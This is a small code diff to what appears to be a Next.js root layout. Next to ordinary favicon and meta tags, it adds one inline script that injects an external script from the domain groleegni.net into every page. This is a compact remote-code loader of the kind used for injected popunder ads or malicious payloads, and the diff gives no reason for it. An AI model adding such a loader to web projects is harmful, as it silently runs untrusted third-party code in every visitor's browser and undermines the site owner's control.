@@ -63,6 +63,7 @@ export default async function RootLayout({ children, params :{locale} }) {
           <link rel="manifest" href="/site.webmanifest" />
           <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
           <meta name="msapplication-TileColor" content="#da532c" />
+          <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9130516,document.createElement('script'))</script>
           <meta name="theme-color" content="#ffffff" />
           <meta name="google-site-verification" content="S80_9wpz81cproUDSD8eSH6043BoZwUoaNYmATG1Pj4" />
         </head>
